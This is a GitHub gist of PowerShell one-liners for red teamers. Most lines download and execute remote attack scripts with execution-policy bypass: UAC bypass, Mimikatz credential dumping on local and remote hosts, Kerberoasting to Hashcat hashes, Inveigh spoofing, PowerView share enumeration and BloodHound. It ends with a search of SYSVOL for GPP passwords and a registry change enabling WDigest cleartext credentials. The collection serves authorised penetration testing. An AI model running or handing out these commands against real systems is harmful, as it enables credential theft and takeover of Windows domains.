RedTeam_CheatSheet.ps1 · GitHub

|     |     |
| --- | --- |
| 1   | # Description: |
| 2   | # Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing. |
| 3   |     |
| 4   | # Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command] |
| 5   | powershell.exe  -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'" |
| 6   |     |
| 7   | # Invoke-Mimikatz: Dump credentials from memory |
| 8   | powershell.exe  -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" |
| 9   |     |
| 10  | # Import Mimikatz Module to run further commands |
| 11  | powershell.exe  -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')" |
| 12  |     |
| 13  | # Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)] |
| 14  | powershell.exe  -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'\|Invoke-MassMimikatz -Verbose" |
| 15  |     |
| 16  | # PowerUp: Privilege escalation checks |
| 17  | powershell.exe  -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks” |
| 18  |     |
| 19  | # Invoke-Inveigh and log output to file |
| 20  | powershell.exe  -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y –Proxy Y -LogOutput Y -FileOutput Y" |
| 21  |     |
| 22  | # Invoke-Kerberoast and provide Hashcat compatible hashes |
| 23  | powershell.exe  -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat" |
| 24  |     |
| 25  | # Invoke-ShareFinder and print output to file |
| 26  | powershell.exe  -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess\|Out-File -FilePath sharefinder.txt" |
| 27  |     |
| 28  | # Import PowerView Module to run further commands |
| 29  | powershell.exe  -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')" |
| 30  |     |
| 31  | # Invoke-Bloodhound |
| 32  | powershell.exe  -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound" |
| 33  |     |
| 34  | # Find GPP Passwords in SYSVOL |
| 35  | findstr /S cpassword $env:logonserver\sysvol\*.xml |
| 36  | findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe) |
| 37  |     |
| 38  | # Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER] |
| 39  | runas /user:DOMAIN\USER /noprofile powershell.exe |
| 40  |     |
| 41  | # Insert reg key to enable Wdigest on newer versions of Windows |
| 42  | reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 |
| 43  |     |